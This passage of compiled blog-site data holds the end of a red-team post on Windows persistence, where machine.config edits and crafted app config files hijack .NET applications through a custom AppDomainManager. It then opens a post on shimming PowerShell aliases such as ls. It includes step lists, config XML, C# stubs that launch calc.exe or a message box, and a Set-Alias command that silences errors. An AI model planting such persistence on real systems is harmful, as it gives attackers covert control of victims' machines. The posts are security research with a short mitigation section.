the pieces together\\nto accomplish persistence. There are a few things we need to perform:\"), mdx(\"ol\", null, mdx(\"li\", {\n    parentName: \"ol\"\n  }, \"Generate a keyfile. Simply do that with sn -k key.snk, \", mdx(\"a\", _extends({\n    parentName: \"li\"\n  }, {\n    \"href\": \"https://docs.microsoft.com/en-us/dotnet/framework/tools/sn-exe-strong-name-tool\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"sn\"), \" standing for strong name tool\"), mdx(\"li\", {\n    parentName: \"ol\"\n  }, \"Create a strong signed .NET assembly using our newly created keyfile\\nwith an assembly that derives from AppDomainManager\\nand overrides InitiliazeNewDomain\"), mdx(\"li\", {\n    parentName: \"ol\"\n  }, \"Install that assembly onto the GAC using \", mdx(\"a\", _extends({\n    parentName: \"li\"\n  }, {\n    \"href\": \"https://docs.microsoft.com/en-us/dotnet/framework/tools/gacutil-exe-gac-tool\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"gacutil\"), \",\\nC# via \", mdx(\"a\", _extends({\n    parentName: \"li\"\n  }, {\n    \"href\": \"https://docs.microsoft.com/en-us/dotnet/api/system.enterpriseservices.internal.publish.gacinstall\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"Publish.GacInstall\"), \",\\nor PowerShell via this amazing \", mdx(\"a\", _extends({\n    parentName: \"li\"\n  }, {\n    \"href\": \"https://gitlab.com/snippets/1878274\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"script\")), mdx(\"li\", {\n    parentName: \"ol\"\n  }, \"Modify machine.config\\u2019s runtime element attribute with the appDomainType and appDomainManagerAssembly elements:\")), mdx(\"p\", null, \"To get the appDomainManagerAssembly you can \"), mdx(\"pre\", null, mdx(\"code\", _extends({\n    parentName: \"pre\"\n  }, {\n    \"className\": \"language-xml\"\n  }), \"<runtime>  \\n    <appDomainManagerType value=\\\"Context Name\\\" />  \\n    <appDomainManagerAssembly   \\n        value=\\\"Signed, Version=1.0.0.0, Culture=neutral, PublicKeyToken=token\\\" />  \\n</runtime> \\n\")), mdx(\"p\", null, \"Luckily machine.config is simply an XML file so it\\u2019s very easy to modify.\\nThere also exists the \", mdx(\"a\", _extends({\n    parentName: \"p\"\n  }, {\n    \"href\": \"https://docs.microsoft.com/en-us/dotnet/api/system.configuration\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"System.Configuration\"), \"\\nnamespace, which also could have been utilized.\\nHowever, the xml method was personally much easier to use.\"), mdx(\"h3\", {\n    \"id\": \"demo-time\"\n  }, \"Demo Time\"), mdx(\"p\", null, \"Putting all those pieces together in a simple program\\nwhich just requires you to put the keyfile in the\\ncorrect spot. This automates the process :)\"), mdx(\"p\", null, \"Assemblies installed onto the GAC are located here:\"), mdx(\"p\", null, \"C:\\\\Windows\\\\Microsoft.NET\\\\assembly\"), mdx(\"p\", null, \"You will most likely see three folders:\"), mdx(\"ul\", null, mdx(\"li\", {\n    parentName: \"ul\"\n  }, \"GAC_32 : For assemblies targeting 32-bit platforms\"), mdx(\"li\", {\n    parentName: \"ul\"\n  }, \"GAC_64 : For assemblies targeting 64-bit platforms\"), mdx(\"li\", {\n    parentName: \"ul\"\n  }, \"GAC_MSIL : For assemblies targeting both 32-bit and 64-bit platforms\")), mdx(\"p\", null, \"You will notice our strong-named assembly called test is installed in GAC_MSIL\"), mdx(\"p\", null, \"One of the most important parts is where we create the class that\\ninherits from appDomainManager.\"), mdx(\"pre\", null, mdx(\"code\", _extends({\n    parentName: \"pre\"\n  }, {\n    \"className\": \"language-csharp\"\n  }), \"using System;\\n    namespace Context {\\n        public sealed class ConfigHooking : AppDomainManager {\\n            public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {\\n                System.Diagnostics.Process.Start(\\\"\\\"calc.exe\\\"\\\");\\n                return;\\n            }\\n        }\\n    }\\n\")), mdx(\"p\", null, mdx(\"img\", _extends({\n    parentName: \"p\"\n  }, {\n    \"src\": \"/22f560d519458db961352e625a13d66a/works.gif\",\n    \"alt\": \"Demo\"\n  }))), mdx(\"p\", null, \"This is running our code that modifies machine.config, which means\\nthat any .NET assembly that is ran will run our code as well.\"), mdx(\"p\", null, \"The full code can be found here:\\n\", mdx(\"a\", _extends({\n    parentName: \"p\"\n  }, {\n    \"href\": \"https://github.com/NotoriousRebel/ConfigPersist/\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"ConfigPersist\")), mdx(\"h3\", {\n    \"id\": \"creating-configs-for-arbitrary-net-assemblies\"\n  }, \"Creating Configs for Arbitrary .NET Assemblies\"), mdx(\"p\", null, \"Thank you to \", mdx(\"a\", _extends({\n    parentName: \"p\"\n  }, {\n    \"href\": \"https://twitter.com/subtee\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"@subTee\"), \" for the amazing research on this technique.\\nRemember what was said earlier about how the runtime locates assemblies.\\nSpecifically number 4:\"), mdx(\"p\", null, mdx(\"strong\", {\n    parentName: \"p\"\n  }, \"Locating the assembly through codebases or probing\")), mdx(\"p\", null, \"We can also take any arbitrary .NET assembly\\nfor example, FileHistory.exe and create a custom config for it\\nsuch as FileHistory.exe.config looking like this:\"), mdx(\"pre\", null, mdx(\"code\", _extends({\n    parentName: \"pre\"\n  }, {\n    \"className\": \"language-xml\"\n  }), \"<configuration>\\n   <runtime>\\n      <assemblyBinding xmlns=\\\"urn:schemas-microsoft-com:asm.v1\\\">\\n         <probing privatePath=\\\"C:\\\\Windows\\\\System32\\\\com;\\\" />\\n      </assemblyBinding>\\n      <appDomainManagerAssembly value=\\\"ArbConfig, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null\\\" />\\n      <appDomainManagerType value=\\\"MyAppDomainManager\\\" />\\n   </runtime>\\n</configuration>\\n\")), mdx(\"p\", null, \"ArbConfig being the name of the unsigned assembly.\\nWe can then simply place that config file\\ninside System32 and the next time FileHistory.exe\\nis ran our code will be ran instead.\"), mdx(\"ol\", null, mdx(\"li\", {\n    parentName: \"ol\"\n  }, \"Create your assembly that derives from AppDomainManager.\"), mdx(\"li\", {\n    parentName: \"ol\"\n  }, \"Place your unsigned assembly in the same directory\\nas the .NET assembly you want to affect.\"), mdx(\"li\", {\n    parentName: \"ol\"\n  }, \"Modify your config with the privatePath being equal\\nto where you placed your assembly.\"), mdx(\"li\", {\n    parentName: \"ol\"\n  }, \"Place the config file in the same directory or a subdirectory\\nas the .NET assembly you want to affect.\")), mdx(\"p\", null, mdx(\"img\", _extends({\n    parentName: \"p\"\n  }, {\n    \"src\": \"/817df49b83adbe093073518465330199/second_demo.gif\",\n    \"alt\": \"second_demo\"\n  }))), mdx(\"p\", null, \"This creates an arbitrary config for FileHistory which\\nmeans when FileHistory is it runs our code in ArbConfig.dll first.\"), mdx(\"p\", null, \"The code for ArbConfig.dll:\"), mdx(\"pre\", null, mdx(\"code\", _extends({\n    parentName: \"pre\"\n  }, {\n    \"className\": \"language-csharp\"\n  }), \"using System;\\nusing System.Reflection;\\nusing System.EnterpriseServices;\\nusing System.Runtime.InteropServices;\\n\\npublic sealed class MyAppDomainManager : AppDomainManager\\n{\\n    public override void InitializeNewDomain(AppDomainSetup appDomainInfo)\\n    {\\n        System.Windows.Forms.MessageBox.Show(\\\"Config Files are fun\\\");\\n        return;\\n    }\\n}\\n\")), mdx(\"p\", null, \"For more information on this technique\\nread about the probing \", mdx(\"a\", _extends({\n    parentName: \"p\"\n  }, {\n    \"href\": \"https://docs.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/probing-element\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"element\"), \".\"), mdx(\"h3\", {\n    \"id\": \"mitigation\"\n  }, \"Mitigation\"), mdx(\"ul\", null, mdx(\"li\", {\n    parentName: \"ul\"\n  }, \"Monitoring for modifications to machine.config\"), mdx(\"li\", {\n    parentName: \"ul\"\n  }, \"Monitoring for dynamic compilation of C# code\")), mdx(\"h3\", {\n    \"id\": \"whats-next\"\n  }, \"What\\u2019s Next?\"), mdx(\"ul\", null, mdx(\"li\", {\n    parentName: \"ul\"\n  }, \"Look into automating the creation of configs for any arbitrary .NET assembly\"), mdx(\"li\", {\n    parentName: \"ul\"\n  }, \"Dig deeper into just how powerful machine.config is\"), mdx(\"li\", {\n    parentName: \"ul\"\n  }, \"Research .NET Core runtime persistence mechanisms\")), mdx(\"h3\", {\n    \"id\": \"closing-thoughts\"\n  }, \"Closing Thoughts\"), mdx(\"p\", null, \"The concept of leveraging built-in config files for persistence is quite fascinating\\nas with the shift from PowerShell to .NET tradecraft, .NET attacks will become\\nmuch more common and frequent.\"), mdx(\"p\", null, mdx(\"strong\", {\n    parentName: \"p\"\n  }, \"Shout outs to:\")), mdx(\"ul\", null, mdx(\"li\", {\n    parentName: \"ul\"\n  }, mdx(\"a\", _extends({\n    parentName: \"li\"\n  }, {\n    \"href\": \"https://twitter.com/am0nsec\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"am0nsec\"), \" for the amazing post\\non CLR hooking and for his awesome suggestions on this post.\"), mdx(\"li\", {\n    parentName: \"ul\"\n  }, mdx(\"a\", _extends({\n    parentName: \"li\"\n  }, {\n    \"href\": \"https://twitter.com/subTee\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"subTee\"), \" for motivating me to work harder\\nand for his amazing research on the topic as well.\")), mdx(\"h2\", {\n    \"id\": \"references\"\n  }, \"References\"), mdx(\"ul\", null, mdx(\"li\", {\n    parentName: \"ul\"\n  }, mdx(\"a\", _extends({\n    parentName: \"li\"\n  }, {\n    \"href\": \"https://docs.microsoft.com/en-us/dotnet/framework/configure-apps/\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"https://docs.microsoft.com/en-us/dotnet/framework/configure-apps/\")), mdx(\"li\", {\n    parentName: \"ul\"\n  }, mdx(\"a\", _extends({\n    parentName: \"li\"\n  }, {\n    \"href\": \"https://docs.microsoft.com/en-us/dotnet/framework/deployment/how-the-runtime-locates-assemblies\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"https://docs.microsoft.com/en-us/dotnet/framework/deployment/how-the-runtime-locates-assemblies\")), mdx(\"li\", {\n    parentName: \"ul\"\n  }, mdx(\"a\", _extends({\n    parentName: \"li\"\n  }, {\n    \"href\": \"https://docs.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/runtime-element\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"https://docs.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/runtime-element\")), mdx(\"li\", {\n    parentName: \"ul\"\n  }, mdx(\"a\", _extends({\n    parentName: \"li\"\n  }, {\n    \"href\": \"https://docs.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/startup/supportedruntime-element\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"https://docs.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/startup/supportedruntime-element\")), mdx(\"li\", {\n    parentName: \"ul\"\n  }, mdx(\"a\", _extends({\n    parentName: \"li\"\n  }, {\n    \"href\": \"https://docs.microsoft.com/en-us/dotnet/api/system.appdomain\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"https://docs.microsoft.com/en-us/dotnet/api/system.appdomain\")), mdx(\"li\", {\n    parentName: \"ul\"\n  }, mdx(\"a\", _extends({\n    parentName: \"li\"\n  }, {\n    \"href\": \"https://docs.microsoft.com/en-us/previous-versions/dotnet/netframework-4.0/15hyw9x3(v=vs.100)\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"https://docs.microsoft.com/en-us/previous-versions/dotnet/netframework-4.0/15hyw9x3(v=vs.100)\"))));\n}\n;\nMDXContent.isMDXComponent = true;","hero":{"full":{"base64":"data:image/jpeg;base64,/9j/2wBDABALDA4MChAODQ4SERATGCgaGBYWGDEjJR0oOjM9PDkzODdASFxOQERXRTc4UG1RV19iZ2hnPk1xeXBkeFxlZ2P/2wBDARESEhgVGC8aGi9jQjhCY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2P/wgARCAAMABQDASIAAhEBAxEB/8QAGAAAAwEBAAAAAAAAAAAAAAAAAAEDAgX/xAAWAQEBAQAAAAAAAAAAAAAAAAABAAL/2gAMAwEAAhADEAAAAejhWwxGF//EABsQAAIBBQAAAAAAAAAAAAAAAAABAhAREjEy/9oACAEBAAEFAtHRihRvN0//xAAUEQEAAAAAAAAAAAAAAAAAAAAQ/9oACAEDAQE/AT//xAAUEQEAAAAAAAAAAAAAAAAAAAAQ/9oACAECAQE/AT//xAAaEAABBQEAAAAAAAAAAAAAAAAQAAECESEx/9oACAEBAAY/AlnBK9Y//8QAGxAAAgIDAQAAAAAAAAAAAAAAAAERIRAxUUH/2gAIAQEAAT8hrYvl0QVAhDwU8Hs//9oADAMBAAIAAwAAABAUP//EABURAQEAAAAAAAAAAAAAAAAAABAR/9oACAEDAQE/EKf/xAAVEQEBAAAAAAAAAAAAAAAAAAAQEf/aAAgBAgEBPxCH/8QAGxABAAIDAQEAAAAAAAAAAAAAAQAhEVFhMXH/2gAIAQEAAT8Qa8wzR2CVdzL+HZ4QetrEjbhjQdkTiNj/2Q==","aspectRatio":1.710144927536232,"src":"/static/fc0ea83a3d926ef2243c1e6ad37005c1/58fe7/binding.jpg","srcSet":"/static/fc0ea83a3d926ef2243c1e6ad37005c1/e0f30/binding.jpg 236w,\n/static/fc0ea83a3d926ef2243c1e6ad37005c1/86afd/binding.jpg 472w,\n/static/fc0ea83a3d926ef2243c1e6ad37005c1/58fe7/binding.jpg 944w,\n/static/fc0ea83a3d926ef2243c1e6ad37005c1/b1cc5/binding.jpg 960w","srcWebp":"/static/fc0ea83a3d926ef2243c1e6ad37005c1/99fbb/binding.webp","srcSetWebp":"/static/fc0ea83a3d926ef2243c1e6ad37005c1/77392/binding.webp 236w,\n/static/fc0ea83a3d926ef2243c1e6ad37005c1/1f177/binding.webp 472w,\n/static/fc0ea83a3d926ef2243c1e6ad37005c1/99fbb/binding.webp 944w,\n/static/fc0ea83a3d926ef2243c1e6ad37005c1/fcc10/binding.webp 960w","sizes":"(max-width: 944px) 100vw, 944px"},"regular":{"base64":"data:image/jpeg;base64,/9j/2wBDABALDA4MChAODQ4SERATGCgaGBYWGDEjJR0oOjM9PDkzODdASFxOQERXRTc4UG1RV19iZ2hnPk1xeXBkeFxlZ2P/2wBDARESEhgVGC8aGi9jQjhCY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2P/wgARCAAMABQDASIAAhEBAxEB/8QAGAAAAwEBAAAAAAAAAAAAAAAAAAEDAgX/xAAWAQEBAQAAAAAAAAAAAAAAAAABAAL/2gAMAwEAAhADEAAAAejhWwxGF//EABsQAAIBBQAAAAAAAAAAAAAAAAABAhAREjEy/9oACAEBAAEFAtHRihRvN0//xAAUEQEAAAAAAAAAAAAAAAAAAAAQ/9oACAEDAQE/AT//xAAUEQEAAAAAAAAAAAAAAAAAAAAQ/9oACAECAQE/AT//xAAaEAABBQEAAAAAAAAAAAAAAAAQAAECESEx/9oACAEBAAY/AlnBK9Y//8QAGxAAAgIDAQAAAAAAAAAAAAAAAAERIRAxUUH/2gAIAQEAAT8hrYvl0QVAhDwU8Hs//9oADAMBAAIAAwAAABAUP//EABURAQEAAAAAAAAAAAAAAAAAABAR/9oACAEDAQE/EKf/xAAVEQEBAAAAAAAAAAAAAAAAAAAQEf/aAAgBAgEBPxCH/8QAGxABAAIDAQEAAAAAAAAAAAAAAQAhEVFhMXH/2gAIAQEAAT8Qa8wzR2CVdzL+HZ4QetrEjbhjQdkTiNj/2Q==","aspectRatio":1.7157894736842105,"src":"/static/fc0ea83a3d926ef2243c1e6ad37005c1/1dc0b/binding.jpg","srcSet":"/static/fc0ea83a3d926ef2243c1e6ad37005c1/3a5ce/binding.jpg 163w,\n/static/fc0ea83a3d926ef2243c1e6ad37005c1/05730/binding.jpg 327w,\n/static/fc0ea83a3d926ef2243c1e6ad37005c1/1dc0b/binding.jpg 653w,\n/static/fc0ea83a3d926ef2243c1e6ad37005c1/b1cc5/binding.jpg 960w","srcWebp":"/static/fc0ea83a3d926ef2243c1e6ad37005c1/0acdf/binding.webp","srcSetWebp":"/static/fc0ea83a3d926ef2243c1e6ad37005c1/ac59e/binding.webp 163w,\n/static/fc0ea83a3d926ef2243c1e6ad37005c1/7660b/binding.webp 327w,\n/static/fc0ea83a3d926ef2243c1e6ad37005c1/0acdf/binding.webp 653w,\n/static/fc0ea83a3d926ef2243c1e6ad37005c1/fcc10/binding.webp 960w","sizes":"(max-width: 653px) 100vw, 653px"},"narrow":{"base64":"data:image/jpeg;base64,/9j/2wBDABALDA4MChAODQ4SERATGCgaGBYWGDEjJR0oOjM9PDkzODdASFxOQERXRTc4UG1RV19iZ2hnPk1xeXBkeFxlZ2P/2wBDARESEhgVGC8aGi9jQjhCY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2P/wgARCAAMABQDASIAAhEBAxEB/8QAGAAAAwEBAAAAAAAAAAAAAAAAAAEDAgX/xAAWAQEBAQAAAAAAAAAAAAAAAAABAAL/2gAMAwEAAhADEAAAAejhWwxGF//EABsQAAIBBQAAAAAAAAAAAAAAAAABAhAREjEy/9oACAEBAAEFAtHRihRvN0//xAAUEQEAAAAAAAAAAAAAAAAAAAAQ/9oACAEDAQE/AT//xAAUEQEAAAAAAAAAAAAAAAAAAAAQ/9oACAECAQE/AT//xAAaEAABBQEAAAAAAAAAAAAAAAAQAAECESEx/9oACAEBAAY/AlnBK9Y//8QAGxAAAgIDAQAAAAAAAAAAAAAAAAERIRAxUUH/2gAIAQEAAT8hrYvl0QVAhDwU8Hs//9oADAMBAAIAAwAAABAUP//EABURAQEAAAAAAAAAAAAAAAAAABAR/9oACAEDAQE/EKf/xAAVEQEBAAAAAAAAAAAAAAAAAAAQEf/aAAgBAgEBPxCH/8QAGxABAAIDAQEAAAAAAAAAAAAAAQAhEVFhMXH/2gAIAQEAAT8Qa8wzR2CVdzL+HZ4QetrEjbhjQdkTiNj/2Q==","aspectRatio":1.7014925373134329,"src":"/static/fc0ea83a3d926ef2243c1e6ad37005c1/eaa58/binding.jpg","srcSet":"/static/fc0ea83a3d926ef2243c1e6ad37005c1/5a3ee/binding.jpg 114w,\n/static/fc0ea83a3d926ef2243c1e6ad37005c1/41f8f/binding.jpg 229w,\n/static/fc0ea83a3d926ef2243c1e6ad37005c1/eaa58/binding.jpg 457w,\n/static/fc0ea83a3d926ef2243c1e6ad37005c1/c309b/binding.jpg 686w,\n/static/fc0ea83a3d926ef2243c1e6ad37005c1/e3008/binding.jpg 914w,\n/static/fc0ea83a3d926ef2243c1e6ad37005c1/b1cc5/binding.jpg 960w","srcWebp":"/static/fc0ea83a3d926ef2243c1e6ad37005c1/15384/binding.webp","srcSetWebp":"/static/fc0ea83a3d926ef2243c1e6ad37005c1/31fce/binding.webp 114w,\n/static/fc0ea83a3d926ef2243c1e6ad37005c1/e3e25/binding.webp 229w,\n/static/fc0ea83a3d926ef2243c1e6ad37005c1/15384/binding.webp 457w,\n/static/fc0ea83a3d926ef2243c1e6ad37005c1/0258d/binding.webp 686w,\n/static/fc0ea83a3d926ef2243c1e6ad37005c1/64ea2/binding.webp 914w,\n/static/fc0ea83a3d926ef2243c1e6ad37005c1/fcc10/binding.webp 960w","sizes":"(max-width: 457px) 100vw, 457px"},"seo":{"src":"/static/fc0ea83a3d926ef2243c1e6ad37005c1/b1cc5/binding.jpg"}}},{"id":"31f00fd2-fe08-554a-8fb0-8e5e4bca4201","slug":"/Using-and-Abusing-Aliases-with-PowerShell","secret":false,"title":"Using and Abusing Aliases with PowerShell","author":"NotoriousRebel","date":"November 24th, 2019","dateForSEO":"2019-11-24T00:00:00.000Z","timeToRead":5,"excerpt":"Shimming Aliases with PowerShell","canonical_url":null,"subscription":true,"body":"function _extends() { _extends = Object.assign || function (target) { for (var i = 1; i < arguments.length; i++) { var source = arguments[i]; for (var key in source) { if (Object.prototype.hasOwnProperty.call(source, key)) { target[key] = source[key]; } } } return target; }; return _extends.apply(this, arguments); }\n\nfunction _objectWithoutProperties(source, excluded) { if (source == null) return {}; var target = _objectWithoutPropertiesLoose(source, excluded); var key, i; if (Object.getOwnPropertySymbols) { var sourceSymbolKeys = Object.getOwnPropertySymbols(source); for (i = 0; i < sourceSymbolKeys.length; i++) { key = sourceSymbolKeys[i]; if (excluded.indexOf(key) >= 0) continue; if (!Object.prototype.propertyIsEnumerable.call(source, key)) continue; target[key] = source[key]; } } return target; }\n\nfunction _objectWithoutPropertiesLoose(source, excluded) { if (source == null) return {}; var target = {}; var sourceKeys = Object.keys(source); var key, i; for (i = 0; i < sourceKeys.length; i++) { key = sourceKeys[i]; if (excluded.indexOf(key) >= 0) continue; target[key] = source[key]; } return target; }\n\n/* @jsx mdx */\nvar _frontmatter = {\n  \"title\": \"Using and Abusing Aliases with PowerShell\",\n  \"author\": \"NotoriousRebel\",\n  \"date\": \"2019-11-24T00:00:00.000Z\",\n  \"hero\": \"./images/Treasure.jpg\",\n  \"excerpt\": \"Shimming Aliases with PowerShell\"\n};\n\nvar makeShortcode = function makeShortcode(name) {\n  return function MDXDefaultShortcode(props) {\n    console.warn(\"Component \" + name + \" was not imported, exported, or provided by MDXProvider as global scope\");\n    return mdx(\"div\", props);\n  };\n};\n\nvar layoutProps = {\n  _frontmatter: _frontmatter\n};\nvar MDXLayout = \"wrapper\";\nreturn function MDXContent(_ref) {\n  var components = _ref.components,\n      props = _objectWithoutProperties(_ref, [\"components\"]);\n\n  return mdx(MDXLayout, _extends({}, layoutProps, props, {\n    components: components,\n    mdxType: \"MDXLayout\"\n  }), mdx(\"h3\", {\n    \"id\": \"introduction\"\n  }, \"Introduction\"), mdx(\"p\", null, mdx(\"a\", _extends({\n    parentName: \"p\"\n  }, {\n    \"href\": \"https://github.com/LOLBAS-Project/LOLBAS\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"LOLBAS\"), \"\\nIn preparation for another \", mdx(\"a\", _extends({\n    parentName: \"p\"\n  }, {\n    \"href\": \"https://lockdown.ubnetdef.org/\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"UB Lockdown\"), \", I had a goal in mind,\\nwork on a new tool for Windows Persistence. It\\u2019s good to thoroughly understand\\nother developers tools that have been made such as\\n\", mdx(\"a\", _extends({\n    parentName: \"p\"\n  }, {\n    \"href\": \"https://github.com/outflanknl/SharpHide/\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"SharpHide\"), \"\\nor\\n\", mdx(\"a\", _extends({\n    parentName: \"p\"\n  }, {\n    \"href\": \"https://github.com/fireeye/SharPersist\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"SharPerist\"), \". However, I wanted to create something\\nfrom scratch and do something different. The problem I faced was that it\\u2019s hard to be unique\\nand create something from scratch when a lot of tools already exist that accomplish your vision. Luckily, I had an idea because when red teaming for Linux one technique for persistence is shimming aliases through .bashrc\\nor .bash_aliases. However, I could not find any tools or much research in regards to using aliases for red teaming Windows. Thus began my journey!\"), mdx(\"h3\", {\n    \"id\": \"understanding-aliases\"\n  }, \"Understanding Aliases\"), mdx(\"p\", null, \"With Powershell becoming more and more prevalent for both red teamers\\nand blue teamers I focused my research into Powershell aliases instead of Command Prompt aliases. By simply doing\\nGet-Alias in Powershell you will see that a lot of things are aliased, some of the most useful and surprising ones are cat, clear, cp, iex, iwr, and ls. This is only a small snippet out of the 158 built-in aliases with Powershell version 5.\\nMicrosoft defines an alias as: \\u201Can alternate name or nickname for a cmdlet or for a command element, such as a function, script, file, or executable file. You can use the alias instead of the command name in any PowerShell commands.\\u201D\"), mdx(\"h3\", {\n    \"id\": \"basic-shimming-with-one-alias\"\n  }, \"Basic Shimming with one Alias\"), mdx(\"p\", null, \"Now that we understand what an Alias is and just how prevalent they are\\nin Powershell now it\\u2019s time to shim one. Let\\u2019s shim the alias ls as it is fairly common. First let\\u2019s see what the ls alias is defined as, to do that we simply type \", mdx(\"br\", null)), mdx(\"pre\", null, mdx(\"code\", _extends({\n    parentName: \"pre\"\n  }, {\n    \"className\": \"language-powershell\"\n  }), \"(Get-Alias -Name ls).Definition\\n\")), mdx(\"p\", null, \"This returns Get-ChildItem which is what ls is aliased to.\"), mdx(\"p\", null, mdx(\"span\", _extends({\n    parentName: \"p\"\n  }, {\n    \"className\": \"gatsby-resp-image-wrapper\",\n    \"style\": {\n      \"position\": \"relative\",\n      \"display\": \"block\",\n      \"marginLeft\": \"auto\",\n      \"marginRight\": \"auto\",\n      \"maxWidth\": \"1234px\"\n    }\n  }), \"\\n      \", mdx(\"span\", _extends({\n    parentName: \"span\"\n  }, {\n    \"className\": \"gatsby-resp-image-background-image\",\n    \"style\": {\n      \"paddingBottom\": \"70.42139384116695%\",\n      \"position\": \"relative\",\n      \"bottom\": \"0\",\n      \"left\": \"0\",\n      \"backgroundImage\": \"url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAOCAIAAACgpqunAAAACXBIWXMAABJ0AAASdAHeZh94AAAB/0lEQVQoz52R20/TUBzHf4Nt4NSgkQgbBEa77uYgxEuCE6U6oy+ohLCt7MK8zA224QV5MSb64rv6oA/qX2eiiY512MLatT2n/tot8WGAiSffnH5P+/v0dznw42f92/dGq/m7vSvJoiw3ZaVZV5o7hiqZ+j7V9lBdo+/Zx+5L0pZBa6uSRMSGLomaKOqNX3RX1HfqqrJPFdVoK1RVSaulo9EUU1WIphPTXpRSUFWFmiahFNXdqH0kVDeIYVCD4G6bjgjpBOuGAdTQzP9dsPX2a/nVp9qbz6WXH3Nb7wrb79deWCpsf0B/hCqvv8CpmRxMrcDEsoNNO4MCeO+C7x6MLcHZRRi5A6OHaGTRigwlaq6QcObCA//CxtS16smZ/InpfODGpneuOBBe7ecE/GOv+oPCYDQDk/NlYJJ+vsolnoxfWUfSFVoN3nwaufUMYWCTjkCqVxBIYUoYu1x0hgRPLD8YzR47l/XEcp5YdiCScYWFPi59IPkX9l8tD1965IuXhy8+xJqRxHqwqsNydmE25cK6xuNFfDiD6ePT+aHZAn5A0h3JONgkRvwDDlyvYM/eeIlLbDJ81U6ei95+zvK1o3ruwCy/gXl88dLE/Pro3GMkcQSTCxWGr1k3x6yAVUKPmCSGWfDp8/eHZtfc1sWkcQwd08el0BwoHKc7nME2/wBcPGjQqG8a3wAAAABJRU5ErkJggg==')\",\n      \"backgroundSize\": \"cover\",\n      \"display\": \"block\"\n    }\n  })), \"\\n  \", mdx(\"picture\", {\n    parentName: \"span\"\n  }, \"\\n        \", mdx(\"source\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"srcSet\": [\"/static/020cda62d41a8bf50ea82c8709683492/c2bb4/basic.webp 1234w\"],\n    \"sizes\": \"(max-width: 1234px) 100vw, 1234px\",\n    \"type\": \"image/webp\"\n  })), \"\\n        \", mdx(\"source\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"srcSet\": [\"/static/020cda62d41a8bf50ea82c8709683492/597b7/basic.png 1234w\"],\n    \"sizes\": \"(max-width: 1234px) 100vw, 1234px\",\n    \"type\": \"image/png\"\n  })), \"\\n        \", mdx(\"img\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"className\": \"gatsby-resp-image-image\",\n    \"src\": \"/static/020cda62d41a8bf50ea82c8709683492/597b7/basic.png\",\n    \"alt\": \"Automate\",\n    \"title\": \"Automate\",\n    \"loading\": \"lazy\",\n    \"style\": {\n      \"width\": \"100%\",\n      \"height\": \"100%\",\n      \"margin\": \"0\",\n      \"verticalAlign\": \"middle\",\n      \"position\": \"absolute\",\n      \"top\": \"0\",\n      \"left\": \"0\"\n    }\n  })), \"\\n      \"), \"\\n    \")), mdx(\"p\", null, \"As we can see here the alias for ls has been redefined to:\"), mdx(\"pre\", null, mdx(\"code\", _extends({\n    parentName: \"pre\"\n  }, {\n    \"className\": \"language-powershell\"\n  }), \"{Get-ChildItem; hello_world}\\n\")), mdx(\"p\", null, \"hello_world being our function that simply prints Hello World!\"), mdx(\"p\", null, \"Let\\u2019s break down what we are actually doing:\"), mdx(\"p\", null, \"hello_world function simply prints Hello World!\\nshimmed_ls is the name of the function we are going to realias ls to\\nthis function simply does Get-ChildItem which is what ls was originally mapped to.\\nNow it is realiased to Get-ChildItem; hello_world\"), mdx(\"p\", null, \"Lastly, let\\u2019s break the command that sets the alias.\"), mdx(\"pre\", null, mdx(\"code\", _extends({\n    parentName: \"pre\"\n  }, {\n    \"className\": \"language-powershell\"\n  }), \"Set-Alias -Name ls -Value shimmed_ls -Option AllScope -Scope Global -ErrorAction SilentlyContinue -Force\\n\")), mdx(\"ul\", null, mdx(\"li\", {\n    parentName: \"ul\"\n  }, mdx(\"p\", {\n    parentName: \"li\"\n  }, mdx(\"strong\", {\n    parentName: \"p\"\n  }, \"Name ls\"), \": Name of our alias we are realiasing\")), mdx(\"li\", {\n    parentName: \"ul\"\n  }, mdx(\"p\", {\n    parentName: \"li\"\n  }, mdx(\"strong\", {\n    parentName: \"p\"\n  }, \"Value shimmed_ls\"), \": What we are realiasing ls to\")), mdx(\"li\", {\n    parentName: \"ul\"\n  }, mdx(\"p\", {\n    parentName: \"li\"\n  }, mdx(\"strong\", {\n    